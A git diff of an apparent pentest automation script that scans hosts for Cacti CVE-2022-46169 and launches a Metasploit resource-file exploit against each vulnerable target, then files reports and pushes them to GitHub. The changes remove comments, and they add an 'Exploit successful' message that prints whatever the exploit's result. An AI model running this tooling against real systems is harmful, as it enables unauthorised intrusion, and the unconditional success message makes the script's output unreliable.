@@ -159,7 +159,6 @@ def exploit_cacti(target, rport, lhost):
     msf_command = "msfconsole -q -r exploit_cacti_resource.rc"
     try:
         result = subprocess.run(msf_command, shell=True, capture_output=True, text=True)
-        print("Exploit output:")
         print(result.stdout)
 
         if result.stdout:
@@ -188,6 +187,7 @@ def detect_and_exploit_vulnerabilities_from_file(filename, lhost, level):
                     if vuln_result:
                         print(f"Processing Exploit: {ip}")
                         exploit_cacti(ip, port, lhost)
+                        print(f"Exploit successful: {ip}")
                 else:
                     print(f"No CVE-2022-46169 Vulnerability Detected: {ip}")
 
@@ -220,6 +220,7 @@ def detect_and_exploit_vulnerabilities_from_public(filename, lhost, level):
                     if vuln_result:
                         print(f"Processing Exploit: {ip}")
                         exploit_cacti(ip, port, lhost)
+                        print(f"Exploit successful: {ip}")
                 else:
                     print(f"No CVE-2022-46169 Vulnerability Detected: {ip}")
 
@@ -257,7 +258,7 @@ def report():
     subprocess.run(["python3", "report.py"])
 
 def github():
-    print("Creating file to Github using github.py")
+    print("Creating file to Github using git.py")
     subprocess.run(["python3","git.py"])
 
 def main():
@@ -271,20 +272,13 @@ def main():
     if mode == "1":  # Local execution
         level = choose_pentesting_level()
         input_targets = input("Masukkan semua target IP atau domain, dipisahkan oleh koma: ")
-
-        # Memisahkan input berdasarkan koma dan membentuk daftar target
         targets = input_targets.split(',')
-
-        # Menghitung jumlah target
         num_targets = len(targets)
-
-        # Memastikan bahwa jumlah target yang dimasukkan sesuai dengan jumlah yang diminta
         if len(targets) == 0 or (len(targets) == 1 and targets[0].strip() == ''):
             print("Anda belum memasukkan target apapun.")
         else:
             for target in targets:
                 print(target.strip())
- 
             interface = 'ens160'
             save_local_ip_to_file(interface)
             save_targets_to_file([target.strip() for target in targets])
@@ -303,20 +297,14 @@ def main():
         detect_and_exploit_vulnerabilities_from_file("nmap_results_parsed.txt", get_ip_address(interface), level)
 
         report()
-
-        # Additional script
         target_range = f"Cacti"
-        # Create a directory with the target name
         target_directory = target_range.replace("/", "_")
         os.makedirs(target_directory, exist_ok=True)
-        # Move the report, PoC, and scan files to the target directory
-        os.rename("10.33.102.212_exploit.txt", os.path.join(target_directory, "10.33.102.212_exploit.txt"))
         os.rename("10.33.102.225_exploit.txt", os.path.join(target_directory, "10.33.102.225_exploit.txt"))
         os.rename("nmap_results.txt", os.path.join(target_directory, "nmap_results.txt"))
         os.rename("vuln_scan.txt", os.path.join(target_directory, "vuln_scan.txt"))
         os.rename("Penetration_Test_Report.docx", os.path.join(target_directory, "Penetration_Test_Report.docx"))
         os.rename("Penetration_Test_Report.pdf", os.path.join(target_directory, "Penetration_Test_Report.pdf"))
-            
         print(f'Pentesting complete. Result saved to {target_directory}')
 
         github()
